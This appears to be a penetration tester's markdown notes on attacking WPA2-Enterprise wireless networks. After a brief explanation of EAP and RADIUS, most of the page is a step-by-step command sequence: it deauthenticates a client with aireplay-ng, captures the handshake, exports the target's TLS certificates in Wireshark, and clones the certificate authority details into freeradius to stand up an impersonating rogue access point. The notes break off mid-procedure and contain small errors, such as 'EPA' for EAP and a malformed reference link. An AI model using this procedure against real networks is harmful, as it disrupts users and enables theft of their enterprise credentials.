# Enterprise

* Uses Extensible Authentication Protocol (EPA) framework to allow for different types of authentication
* Authentication is done using a Remote Authentication Dial-In User Service (RADIUS) server
* Client authenticates using EAP frames depending on the agreed upon authentication scheme
* They are relayed by the AP to the RADIUS server
* If authentication is successfull, then the result is used as a Pairwise Master Key (PMK) for the four-way hanshake instead of the Pre Shared Key (PSK).

We will create a rogue AP that matches the target closely

## PEAP Exchange


## Installation

```bash
# Hostapd-mana
sudo apt-get install hostapd-mana -y
```
[Rogue AP with Mana Instructions](../rogue-ap.md)

```bash
# Install and configure freeradius (optional)
sudo apt-get install freeradius -y
```


## Commands

* Run [setup](../../setup.md) first
* Two terminals are needed
* At least on client associated with the AP

```bash
# [Terminal One]
# Collect data about the victim AP - specifically CA stuff
# The goal is to create a rogue AP
sudo airodump-ng $INTERFACE

# Look for MGT as AUTH - this is enterprise

# Stop it
qq

# Now target is found, do normal capture of it

# Set interface to monitor mode
sudo airmon-ng start $INTERFACE

# Start monitoring to collect data
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE

# [Terminal Two]
# Run the deauthentication attack to get four-way handshake
sudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE

# Wait for the four-way handshake to appear in airodump-ng window.

# Stop it
qq

# Turn off monitor mode
sudo airmon-ng stop $INTERFACE

# Open Wirshark
sudo wireshark $PCAP

# Filter for certificate
tls.handshake.certificate
# OR
tls.handshake.certificate

# Drill down to get the certs
# Extensible Authentication Protocol -> Transport Layer Security -> TLSv1 Record layer: Handshake Protocol Certificate ...
#Expand Handshake Protocol: Certificate
#Certificates
#... one or more certificates will appear as Certificate: <details>
# For each certificate, right click and select Export Packet Bytes
# Save each one with the .der extension
# Display info
# openssl x509 -inform der -in DER_CERTIFICATE_FILENAME -text
# Convert to PEM format
# openssl x509 -inform der -in DER_CERTIFICATE_FILENAME -outform pem -out PEM_OUTPUT.crt

# [Terminal Two]
sudo apt-get install freeradius -y

cd /etc/freeradius/3.0/certs

# Create this as close to the target's AP as possible
# Use wireshark to view the certificate details under the TLS layer
vi ca.cnf

[certificate_authority]
countryName             = US
stateOrProvinceName     = OR
localityName            = Portland
organizationName        = Ashat
emailAddress            = ca@ashat.com
commonName              = "Ashat Certificate Authority"
```

# Check validity of cert's expiration date(.pem/.crt)
# openssl x509 -in CERT_FILENAME -noout -enddate

## References

* [Challenge Handshake Authentication Protocol (CHAP)](https://en.wikipedia.org/wiki/Challenge-Handshake_Authentication_Protocol)
* [Extensible Authentication Protocol (EAP)](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)
* [EAP PEAP Authentication Protocol](https://wiki.freeradius.org/protocol/EAP-PEAP)
[EAP-TLS Authentication Protocol](https://datatracker.ietf.org/doc/html/rfc5216)
* [MS-CHAP](* [Extensible Authentication Protocol (EAP)](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol))
* [Password Authentication Protocol (PAP)](https://en.wikipedia.org/wiki/Password_Authentication_Protocol)
* [RADIUS](https://en.wikipedia.org/wiki/RADIUS)
